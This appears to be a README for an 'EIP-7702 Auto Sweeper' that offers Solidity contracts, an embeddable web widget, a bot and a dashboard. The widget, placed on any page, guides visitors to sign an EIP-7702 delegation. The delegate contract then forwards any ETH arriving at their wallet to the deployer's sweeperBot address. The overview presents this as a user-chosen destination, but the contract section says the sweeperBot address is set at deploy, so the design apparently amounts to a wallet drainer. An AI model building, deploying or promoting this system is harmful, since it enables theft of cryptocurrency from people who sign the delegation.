<div align="center">

# ⚡ EIP-7702 Auto Sweeper System

**Automatic ETH sweeping powered by EIP-7702 account delegation**

[![Solidity](https://img.shields.io/badge/Solidity-0.8.23-363636?logo=solidity)](https://soliditylang.org)
[![Hardhat](https://img.shields.io/badge/Hardhat-2.19-yellow?logo=ethereum)](https://hardhat.org)
[![OpenZeppelin](https://img.shields.io/badge/OpenZeppelin-5.0-blue)](https://openzeppelin.com)
[![License: MIT](https://img.shields.io/badge/License-MIT-green)](LICENSE)

[Overview](#overview) · [Architecture](#architecture) · [Quick Start](#quick-start) · [Smart Contracts](#smart-contracts) · [CDN Widget](#cdn-widget) · [Backend](#backend) · [Dashboard](#dashboard) · [Configuration](#configuration) · [Deployment](#deployment)

</div>

---

## Overview

The **EIP-7702 Auto Sweeper System** lets any Ethereum EOA automatically forward incoming ETH to a designated destination without holding a smart contract wallet. By delegating to the `SweeperDelegate` contract via [EIP-7702](https://eips.ethereum.org/EIPS/eip-7702), a normal wallet gains smart-contract behaviour — on-demand or scheduled sweeping — while remaining a regular EOA.

**Key capabilities**

| Feature | Detail |
|---|---|
| 🔑 EIP-7702 delegation | EOA temporarily adopts delegate contract code |
| 🤖 Automated sweeper bot | Node.js bot monitors addresses and triggers sweeps |
| 🌐 CDN embeddable widget | Drop-in JavaScript widget for any web page |
| 📊 Next.js dashboard | Real-time sweep history and system stats |
| 🗄️ MongoDB + Redis | Persistent storage and high-speed caching |
| 🌍 Multi-chain | Ethereum · Polygon · Arbitrum · Optimism · Base |

---

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    CDN Widget (Browser)                  │
│  SweeperWidget.js — embeddable UI, EIP-7702 auth flow   │
└────────────────────────┬────────────────────────────────┘
                         │ signs EIP-7702 delegation
                         ▼
┌─────────────────────────────────────────────────────────┐
│              Ethereum / EVM-compatible chain             │
│  SweeperDelegate ◄── SweeperFactory ◄── SweeperRegistry │
└────────────────────────┬────────────────────────────────┘
                         │ events / polling
                         ▼
┌──────────────┐   ┌──────────────┐   ┌──────────────────┐
│ Sweeper Bot  │   │  Monitoring  │   │   Dashboard UI   │
│  (Node.js)   │──▶│   Service    │──▶│   (Next.js)      │
└──────┬───────┘   └──────────────┘   └──────────────────┘
       │
  ┌────┴────┐
  │ MongoDB │ Redis
  └─────────┘
```

### Directory layout

```
eip7702-sweeper-system/
├── contracts/               # Solidity smart contracts
│   ├── SweeperDelegate.sol  # EIP-7702 delegate logic
│   ├── SweeperFactory.sol   # Clone factory for delegates
│   ├── SweeperRegistry.sol  # On-chain registry of delegators
│   └── interfaces/          # Shared interfaces
├── cdn-widget/              # Embeddable browser widget
│   └── src/
│       ├── SweeperWidget.js # Main widget class
│       ├── index.js         # Entry point
│       ├── utils.js         # Helpers
│       └── styles.css       # Widget styles
├── backend/
│   ├── sweeper-bot/         # Automated sweep executor
│   └── monitoring/          # Health & metrics service
├── dashboard/               # Next.js management UI
├── scripts/                 # Hardhat deployment scripts
├── test/                    # Contract test suite
├── hardhat.config.js
├── docker-compose.yml
└── .env.example
```

---

## Quick Start

### Prerequisites

- Node.js ≥ 18
- Docker & Docker Compose (for full stack)
- An Alchemy (or compatible) RPC API key

### 1 — Clone & install

```bash
git clone https://github.com/lackx741-tech/NewArdel.git
cd NewArdel
npm install
```

### 2 — Configure environment

```bash
cp .env.example .env
# Edit .env with your RPC URLs, private keys, and API keys
```

### 3 — Compile contracts

```bash
npm run compile
```

### 4 — Run tests

```bash
npm test
```

### 5 — Start local node + deploy

```bash
npm run node          # terminal 1 — spins up hardhat node
npm run deploy        # terminal 2 — deploys contracts to localhost
```

### 6 — Start the full stack (Docker)

```bash
docker-compose up -d
```

| Service | URL |
|---|---|
| CDN Widget | http://localhost:80 |
| Dashboard | http://localhost:3000 |
| Monitoring API | http://localhost:3001 |
| MongoDB | localhost:27017 |
| Redis | localhost:6379 |

---

## Smart Contracts

### `SweeperDelegate`

The core EIP-7702 delegate contract. When an EOA signs a delegation pointing at this contract, every incoming transaction to that EOA executes this contract's `fallback()` — automatically sweeping any ETH above the configured minimum to the sweeper bot address.

**Key parameters**

| Parameter | Description | Default |
|---|---|---|
| `minSweepAmount` | Minimum ETH (wei) to trigger a sweep | set at deploy |
| `maxGasPrice` | Gas price ceiling (gwei) | set at deploy |
| `sweepCooldown` | Seconds between sweeps per address | set at deploy |
| `sweeperBot` | Destination address for swept funds | set at deploy |

**Main functions**

```solidity
// Called by the sweeper bot for a single address
function executeSweep(address target) external onlySweeperBot;

// Batch sweep — skips addresses that don't meet criteria
function executeBatchSweep(address[] calldata targets) external onlySweeperBot;

// Read-only status check
function getSweepStatus(address eoa)
    external view
    returns (bool canSweep, uint256 balance, uint256 timeUntilNextSweep);
```

**Events**

```solidity
event SweepExecuted(address indexed from, address indexed to, uint256 amount, uint256 timestamp);
event SweeperBotUpdated(address indexed oldBot, address indexed newBot);
```

### `SweeperFactory`

Deploys minimal proxy clones of `SweeperDelegate` so each user can have an isolated delegate instance at minimal gas cost.

### `SweeperRegistry`

On-chain registry that maps EOA addresses to their active delegate instances, enabling the sweeper bot to discover targets efficiently.

---

## CDN Widget

Embed the widget in any web page with a single script tag:

```html
<script src="https://cdn.yourdomain.com/sweeper-widget.js"></script>
<script>
  const sweeper = new SweeperWidget({
    delegateAddress: "0xYourDeployedDelegateAddress",
    chainId: 1,               // 1=Ethereum, 137=Polygon, 42161=Arbitrum …
    theme: "light",           // "light" | "dark"
    position: "bottom-right", // "bottom-right" | "bottom-left" | "top-right" | "top-left"
    autoStart: true
  });
</script>
```

### Widget features

- 🔌 Auto-detects MetaMask / injected provider
- ✍️ Guides user through EIP-7702 authorization signing
- 📈 Live balance display (polls every 15 s)
- 🕑 Sweep history log (persisted to `localStorage`)
- 📱 Fully responsive — adapts to mobile viewports
- 🎨 Light and dark themes

### Build the widget

```bash
npm run widget:build   # production bundle → cdn-widget/dist/
npm run widget:dev     # watch mode with hot reload
```

---

## Backend

### Sweeper Bot

Continuously monitors registered EOAs and calls `executeBatchSweep` when conditions are met.

```bash
npm run bot:start
# or via Docker:
docker-compose up sweeper-bot
```

**Environment** (`backend/sweeper-bot/.env`)

```env
SWEEPER_BOT_PRIVATE_KEY=0x...
SWEEPER_CONTRACT_ADDRESS=0x...
MIN_SWEEP_AMOUNT=0.01         # ETH
MAX_GAS_PRICE=100             # gwei
SWEEP_INTERVAL=30000          # ms between poll cycles
MONGODB_URI=mongodb://...
REDIS_URL=redis://...
```

### Monitoring Service

Exposes a REST API (port 3001) with health checks, sweep statistics, and alerting via Discord webhooks.

```bash
docker-compose up monitoring
```

---

## Dashboard

A Next.js admin dashboard for managing the sweeper system.

```bash
npm run dashboard:dev   # development server on http://localhost:3000
# or via Docker:
docker-compose up dashboard
```

**Pages**

| Route | Description |
|---|---|
| `/` | Overview — live stats and system status |
| `/api/*` | Internal API routes consumed by the UI |

---

## Configuration

### Environment variables (`.env.example`)

```env
# RPC endpoints
MAINNET_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/YOUR-API-KEY
SEPOLIA_RPC_URL=https://eth-sepolia.g.alchemy.com/v2/YOUR-API-KEY
POLYGON_RPC_URL=https://polygon-mainnet.g.alchemy.com/v2/YOUR-API-KEY
ARBITRUM_RPC_URL=https://arb-mainnet.g.alchemy.com/v2/YOUR-API-KEY
OPTIMISM_RPC_URL=https://opt-mainnet.g.alchemy.com/v2/YOUR-API-KEY
BASE_RPC_URL=https://mainnet.base.org

# Deployer
PRIVATE_KEY=your_private_key_without_0x

# Block explorer API keys (for contract verification)
ETHERSCAN_API_KEY=...
POLYGONSCAN_API_KEY=...
ARBISCAN_API_KEY=...
OPTIMISTIC_ETHERSCAN_API_KEY=...
BASESCAN_API_KEY=...

# Bot
SWEEPER_BOT_PRIVATE_KEY=...
SWEEPER_CONTRACT_ADDRESS=...
MIN_SWEEP_AMOUNT=0.01
MAX_GAS_PRICE=100
SWEEP_INTERVAL=30000

# CDN
CDN_URL=https://cdn.yourdomain.com
WIDGET_VERSION=1.0.0

# Database
MONGODB_URI=mongodb://localhost:27017/sweeper
REDIS_URL=redis://localhost:6379

# Alerting
WEBHOOK_SECRET=...
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
```

### Supported networks

| Network | Chain ID | Config key |
|---|---|---|
| Ethereum Mainnet | 1 | `mainnet` |
| Sepolia Testnet | 11155111 | `sepolia` |
| Polygon | 137 | `polygon` |
| Arbitrum One | 42161 | `arbitrum` |
| Optimism | 10 | `optimism` |
| Base | 8453 | `base` |

---

## Deployment

### Deploy contracts

```bash
# Testnet (Sepolia)
npm run deploy -- --network sepolia

# Mainnet
npm run deploy -- --network mainnet

# Verify on Etherscan
npm run verify -- --network mainnet
```

### Docker Compose (production)

```bash
# Start all services
docker-compose up -d

# View logs
docker-compose logs -f sweeper-bot

# Stop everything
docker-compose down
```

### CDN (nginx)

The `cdn-widget` service serves the built widget from `cdn-widget/dist/` via nginx. Configure `cdn-widget/nginx.conf` for TLS and your domain before deploying.

---

## npm scripts

| Script | Description |
|---|---|
| `npm run compile` | Compile Solidity contracts |
| `npm test` | Run Hardhat test suite |
| `npm run deploy` | Deploy contracts (append `--network <name>`) |
| `npm run verify` | Verify deployed contracts on block explorers |
| `npm run node` | Start local Hardhat node |
| `npm run widget:build` | Build CDN widget bundle |
| `npm run widget:dev` | Widget dev server with hot reload |
| `npm run bot:start` | Start the sweeper bot |
| `npm run dashboard:dev` | Start Next.js dashboard in dev mode |

---

## Security

- All sweep transactions go through **reentrancy-guarded** functions (`ReentrancyGuard`).
- Only the designated `sweeperBot` address can call `executeSweep` / `executeBatchSweep`.
- A configurable `sweepCooldown` prevents rapid successive sweeps of the same address.
- A `maxGasPrice` ceiling ensures sweeps are never triggered during fee spikes.
- The contract can be **paused** by the owner at any time via `pause()`.
- **Never commit private keys.** Use `.env` files that are listed in `.gitignore`.

---

## License

[MIT](LICENSE) © lackx741-tech
